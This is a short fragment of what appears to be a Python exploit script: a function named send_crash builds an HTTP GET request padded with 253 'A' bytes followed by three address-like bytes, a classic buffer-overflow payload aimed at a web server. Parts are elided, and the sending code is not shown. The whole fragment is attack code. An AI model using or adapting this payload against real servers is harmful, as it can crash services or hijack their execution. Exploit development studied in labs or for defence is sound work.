...
def send_crash(server, port):
    ...
    buffer = b"GET /"
    payload = b""
    # payload += b""
    payload += b"\x41" * 253
    payload += b"\x74\x86\x41"
    buffer += payload
    buffer += b"\r\n\r\n"
